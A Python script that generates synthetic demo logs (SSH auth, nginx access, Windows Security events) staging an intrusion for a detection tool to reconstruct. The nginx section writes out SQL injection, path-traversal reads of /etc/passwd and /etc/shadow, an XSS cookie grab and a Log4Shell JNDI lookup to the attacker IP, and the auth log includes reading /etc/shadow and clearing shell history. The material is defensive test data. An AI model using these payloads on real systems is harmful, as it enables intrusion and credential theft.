#!/usr/bin/env python3
"""Generate the bundled demo logs.

The scenario is a single intrusion told across three log sources, so the
detections have a story to reconstruct rather than isolated noise:

  1. 04:0x  Recon      - a scanner sweeps the web app from 45.83.91.22
  2. 04:1x  Exploit    - SQLi and traversal payloads against /login and /download
  3. 04:2x  Enumerate  - SSH probing of non-existent accounts
  4. 04:3x  Brute force- 40 password guesses against 'deploy' and 'root'
  5. 04:4x  Access     - 'deploy' authenticates from the attacker IP
  6. 04:5x  Escalate   - failed sudo, then sudo cat /etc/shadow
  7. 05:0x  Persist    - Windows: svc_backup created and added to Domain Admins
  8. 05:1x  Travel     - 'deploy' logs in from Pakistan 9 minutes after Amsterdam

Legitimate background traffic is mixed in so the detections have to
discriminate rather than flag everything.

Run:  python samples/generate_samples.py
"""

from __future__ import annotations

import json
import os
import random
from datetime import datetime, timedelta, timezone

HERE = os.path.dirname(os.path.abspath(__file__))
random.seed(1337)

ATTACKER = "45.83.91.22"
ATTACKER_2 = "185.220.101.44"
LEGIT_OFFICE = "39.41.2.9"
INTERNAL = "10.20.4.15"
HOST = "web-01"
DC = "DC-01"

DAY = datetime(2026, 9, 21, tzinfo=timezone.utc)
MONTHS = ["Jan", "Feb", "Mar", "Apr", "May", "Jun",
          "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"]


def syslog_ts(ts: datetime) -> str:
    return f"{MONTHS[ts.month - 1]} {ts.day:2d} {ts:%H:%M:%S}"


def clf_ts(ts: datetime) -> str:
    return f"{ts.day:02d}/{MONTHS[ts.month - 1]}/{ts.year}:{ts:%H:%M:%S} +0000"


def at(hour: int, minute: int, second: int = 0) -> datetime:
    return DAY + timedelta(hours=hour, minutes=minute, seconds=second)


# --------------------------------------------------------------------------
# 1. Linux auth.log
# --------------------------------------------------------------------------
def build_auth_log() -> list[tuple[datetime, str]]:
    rows: list[tuple[datetime, str]] = []

    def add(ts: datetime, proc: str, msg: str) -> None:
        rows.append((ts, f"{syslog_ts(ts)} {HOST} {proc}: {msg}"))

    # Background: normal morning logins from the office.
    for i, user in enumerate(["abdullah", "sara", "bilal"]):
        ts = at(3, 5 + i * 7)
        add(ts, f"sshd[{1000 + i}]", f"Accepted publickey for {user} from {LEGIT_OFFICE} port {40000 + i} ssh2")
        add(ts + timedelta(seconds=1), f"sshd[{1000 + i}]",
            f"pam_unix(sshd:session): session opened for user {user} by (uid=0)")
    # A real user fat-fingers their password twice - must NOT alert.
    for i in range(2):
        add(at(3, 40, i * 20), "sshd[1207]",
            f"Failed password for sara from {LEGIT_OFFICE} port {41000 + i} ssh2")
    add(at(3, 41), "sshd[1207]", f"Accepted password for sara from {LEGIT_OFFICE} port 41010 ssh2")

    # 3. Username enumeration from the attacker.
    for i, user in enumerate(
        ["admin", "test", "oracle", "ubuntu", "jenkins", "git", "postgres", "backup"]
    ):
        ts = at(4, 22, i * 4)
        add(ts, f"sshd[{2000 + i}]",
            f"Invalid user {user} from {ATTACKER} port {50000 + i}")
        add(ts + timedelta(seconds=1), f"sshd[{2000 + i}]",
            f"Failed password for invalid user {user} from {ATTACKER} port {50000 + i} ssh2")

    # 4. Brute force against two real accounts.
    pid = 3000
    for i in range(40):
        ts = at(4, 31, i * 3)
        user = "deploy" if i % 2 == 0 else "root"
        add(ts, f"sshd[{pid + i}]",
            f"Failed password for {user} from {ATTACKER} port {51000 + i} ssh2")

    # 5. The guess lands.
    success = at(4, 33, 30)
    add(success, "sshd[3210]", f"Accepted password for deploy from {ATTACKER} port 51500 ssh2")
    add(success + timedelta(seconds=1), "sshd[3210]",
        "pam_unix(sshd:session): session opened for user deploy by (uid=0)")

    # 6. Privilege escalation.
    add(at(4, 41), "sudo", "  deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/id")
    add(at(4, 42), "sudo",
        "  deploy : 3 incorrect password attempts ; TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow")
    add(at(4, 44), "sudo",
        "  deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow")
    add(at(4, 45), "sudo",
        "  deploy : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/bash -c history -c")
    add(at(4, 46), "sudo", "  guest : user NOT in sudoers ; TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/bin/sh")

    # 7. Off-hours root login from a second attacker node.
    add(at(2, 14), "sshd[4100]", f"Accepted password for root from {ATTACKER_2} port 52001 ssh2")
    add(at(2, 14, 2), "sshd[4100]",
        "pam_unix(sshd:session): session opened for user root by (uid=0)")

    # 8. Impossible travel: deploy in Amsterdam at 04:33, Lahore at 04:42.
    add(at(4, 42, 30), "sshd[3400]",
        f"Accepted password for deploy from {LEGIT_OFFICE} port 51999 ssh2")

    # Housekeeping noise.
    for i in range(6):
        ts = at(5, 10 + i * 5)
        add(ts, f"sshd[{5000 + i}]",
            f"pam_unix(sshd:session): session closed for user {'abdullah' if i % 2 else 'sara'}")
    add(at(5, 30), "sshd[5100]", f"Accepted publickey for backupsvc from {INTERNAL} port 43000 ssh2")

    rows.sort(key=lambda r: r[0])
    return rows


# --------------------------------------------------------------------------
# 2. nginx access log
# --------------------------------------------------------------------------
def build_nginx_log() -> list[tuple[datetime, str]]:
    rows: list[tuple[datetime, str]] = []

    def add(ts: datetime, ip: str, method: str, path: str, status: int,
            size: int, agent: str, referer: str = "-") -> None:
        rows.append((
            ts,
            f'{ip} - - [{clf_ts(ts)}] "{method} {path} HTTP/1.1" {status} {size} '
            f'"{referer}" "{agent}"',
        ))

    browser = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
               "(KHTML, like Gecko) Chrome/141.0 Safari/537.36")

    # Background: real users browsing.
    pages = ["/", "/complaints", "/complaints/new", "/static/app.css",
             "/static/app.js", "/api/v1/me", "/dashboard"]
    for i in range(45):
        add(at(3, i % 60, (i * 7) % 60), LEGIT_OFFICE, "GET",
            random.choice(pages), 200, random.randint(400, 9000), browser)

    # 1. Recon sweep - scanner UA, lots of 404s.
    probe_paths = [
        "/admin", "/administrator", "/phpmyadmin/", "/.env", "/.git/config",
        "/wp-login.php", "/server-status", "/backup.zip", "/config.json",
        "/api/v1/../../etc/passwd", "/cgi-bin/test.cgi", "/actuator/env",
    ]
    for i, path in enumerate(probe_paths):
        add(at(4, 2, i * 6), ATTACKER, "GET", path, 404, 153, "Nikto/2.5.0")

    # 2. Exploitation attempts.
    add(at(4, 12, 0), ATTACKER, "GET",
        "/login?user=admin%27%20OR%20%271%27%3D%271", 500, 612, "sqlmap/1.7.11")
    add(at(4, 12, 9), ATTACKER, "GET",
        "/api/v1/complaints?id=1%20UNION%20SELECT%20username,password%20FROM%20users",
        500, 588, "sqlmap/1.7.11")
    add(at(4, 12, 18), ATTACKER, "GET",
        "/api/v1/complaints?id=1%20AND%20SLEEP(5)", 200, 233, "sqlmap/1.7.11")
    add(at(4, 13, 2), ATTACKER, "GET",
        "/download?file=..%2F..%2F..%2Fetc%2Fpasswd", 200, 1841, "curl/8.5.0")
    add(at(4, 13, 30), ATTACKER, "GET",
        "/download?file=..%2F..%2F..%2Fetc%2Fshadow", 403, 153, "curl/8.5.0")
    add(at(4, 14, 5), ATTACKER, "POST",
        "/api/v1/feedback?msg=%3Cscript%3Edocument.cookie%3C%2Fscript%3E", 200, 44, browser)
    add(at(4, 15, 0), ATTACKER_2, "GET", "/", 200, 4021,
        "${jndi:ldap://45.83.91.22:1389/a}")
    add(at(4, 16, 0), ATTACKER, "GET", "/shell.php", 404, 153, "Mozilla/5.0")

    # Benign traffic continues during the attack - the detector must not flag it.
    for i in range(15):
        add(at(4, 20 + i, (i * 11) % 60), LEGIT_OFFICE, "GET",
            random.choice(pages), 200, random.randint(400, 9000), browser)
    # One genuine 404 from a real user.
    add(at(4, 35), LEGIT_OFFICE, "GET", "/favicon.ico", 404, 153, browser)

    rows.sort(key=lambda r: r[0])
    return rows


# --------------------------------------------------------------------------
# 3. Windows Security log (JSON lines)
# --------------------------------------------------------------------------
def build_windows_log() -> list[dict]:
    records: list[dict] = []

    def add(ts: datetime, event_id: int, **fields) -> None:
        records.append({"TimeCreated": ts.strftime("%Y-%m-%dT%H:%M:%SZ"),
                        "EventID": event_id, "Computer": DC, **fields})

    # Background: successful domain logons.
    for i, user in enumerate(["abdullah", "sara", "bilal"]):
        add(at(3, 10 + i * 6), 4624, TargetUserName=user,
            IpAddress=LEGIT_OFFICE, LogonType=3)

    # Password spray: one attempt each against many accounts.
    spray_users = ["administrator", "admin", "helpdesk", "svc_sql", "jdoe",
                   "abdullah", "sara", "bilal", "guest"]
    for i, user in enumerate(spray_users):
        add(at(4, 50, i * 20), 4625, TargetUserName=user,
            IpAddress=ATTACKER_2, LogonType=3, Status="0xC000006A")

    # Persistence on the DC.
    add(at(5, 2), 4720, TargetUserName="svc_backup", SubjectUserName="deploy")
    add(at(5, 3), 4728, TargetUserName="svc_backup", TargetGroupName="Domain Admins",
        SubjectUserName="deploy")
    add(at(5, 4), 4672, TargetUserName="svc_backup")
    add(at(5, 6), 4624, TargetUserName="svc_backup", IpAddress=ATTACKER_2, LogonType=10)
    add(at(5, 20), 4740, TargetUserName="administrator")

    records.sort(key=lambda r: r["TimeCreated"])
    return records


def main() -> None:
    auth_path = os.path.join(HERE, "auth.log")
    nginx_path = os.path.join(HERE, "nginx_access.log")
    win_path = os.path.join(HERE, "windows_security.json")

    with open(auth_path, "w", encoding="utf-8") as fh:
        fh.write("\n".join(line for _, line in build_auth_log()) + "\n")
    with open(nginx_path, "w", encoding="utf-8") as fh:
        fh.write("\n".join(line for _, line in build_nginx_log()) + "\n")
    with open(win_path, "w", encoding="utf-8") as fh:
        for record in build_windows_log():
            fh.write(json.dumps(record) + "\n")

    for path in (auth_path, nginx_path, win_path):
        with open(path, encoding="utf-8") as fh:
            print(f"wrote {os.path.relpath(path, os.path.dirname(HERE))}: "
                  f"{sum(1 for _ in fh)} lines")


if __name__ == "__main__":
    main()
